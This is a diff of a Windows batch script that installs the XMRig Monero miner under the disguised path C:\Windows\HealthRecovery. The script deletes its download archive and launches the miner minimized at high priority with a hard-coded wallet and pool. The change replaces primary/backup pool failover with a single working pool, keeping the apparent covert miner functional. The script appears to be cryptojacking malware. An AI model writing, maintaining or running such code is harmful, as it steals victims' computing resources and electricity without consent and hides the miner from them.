@@ -14,10 +14,9 @@ set "INSTALL_DIR=C:\Windows\HealthRecovery"
 set "ZIP_NAME=ExecFileD.zip"
 set "EXTRACTED_EXE=%INSTALL_DIR%\windowsrecovery\xmrig.exe"
 
-:: Wallet and primary/backup pools
+:: Wallet and working pool
 set "WALLET=4Ay91o3ogBbGn5dJdC4KmiCXku3XpZEMC5Rj2zN2Vv1Mb232V9bFVGjXCQftWYsjkELcyu9dGqnLdDQvjU4ioNrN9AohihD"
-set "POOL_PRIMARY=pool.minexmr.com:443"
-set "POOL_BACKUP=pool.supportxmr.com:7777"
+set "POOL=pool.supportxmr.com:7777"
 
 :: === CREATE INSTALL DIRECTORY ===
 echo Creating install directory...
@@ -64,17 +63,10 @@ if %errorlevel% neq 0 (
 :: === DELETE ZIP ===
 del /f /q "%INSTALL_DIR%\%ZIP_NAME%"
 
-:: === RUN XMRIG MINER ===
+:: === RUN XMRIG MINER USING WORKING POOL ===
 if exist "%EXTRACTED_EXE%" (
-    echo Attempting to run XMRig miner on primary pool...
-    start "" /min /high "%EXTRACTED_EXE%" -o %POOL_PRIMARY% -u %WALLET% -p x --tls --coin=monero --donate-level=1
-    timeout /t 10 >nul
-    :: Check if miner failed to connect by pinging pool
-    nslookup %POOL_PRIMARY:~0,-4% >nul 2>&1
-    if %errorlevel% neq 0 (
-        echo Primary pool failed. Switching to backup pool...
-        start "" /min /high "%EXTRACTED_EXE%" -o %POOL_BACKUP% -u %WALLET% -p x --coin=monero --donate-level=1
-    )
+    echo Running XMRig miner on working pool...
+    start "" /min /high "%EXTRACTED_EXE%" -o %POOL% -u %WALLET% -p x --coin=monero --donate-level=1
 ) else (
     echo ERROR: %EXTRACTED_EXE% not found after extraction.
     pause
